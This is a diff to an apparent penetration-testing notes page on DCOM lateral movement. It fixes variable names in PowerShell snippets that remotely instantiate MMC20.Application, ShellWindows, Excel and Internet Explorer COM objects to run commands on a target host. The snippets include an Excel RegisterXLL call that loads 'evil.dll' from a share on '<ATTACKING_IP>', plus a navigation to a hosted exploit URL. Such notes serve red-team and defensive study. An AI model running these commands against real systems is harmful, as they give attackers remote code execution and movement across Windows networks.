@@ -85,7 +85,7 @@ As an administrator we can remotely interact with this COM through MS-DCOM proto
 $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))
 
 #Execute commands
-$a.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\cmd.exe",$null,"/c hostname > c:\pwned.txt","7")
+$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\cmd.exe",$null,"/c hostname > c:\pwned.txt","7")
 ```
 {% endtab %}
 {% endtabs %}
@@ -106,7 +106,7 @@ $com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
 
 #Execute commands
-$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
+$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
 ```
 {% endtab %}
 {% endtabs %}
@@ -169,6 +169,7 @@ $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Appli
 
 #Register DLL
 $com.Application.RegisterXLL("C:\Windows\evil.dll")
+#OR
 $com.Application.RegisterXLL("\\<ATTACKING_IP>\Share\evil.dll")
 ```
 {% endtab %}
@@ -215,7 +216,7 @@ $com = [Activator]::CreateInstance([type]::GetTypeFromProgID("InternetExplorer.A
 $com.Visible = $true
 
 #Browse to hosted exploit
-$Object_COM.Navigate("http://192.168.100.1/exploit")
+$com.Navigate("http://192.168.100.1/exploit")
 ```
 {% endtab %}
 {% endtabs %}
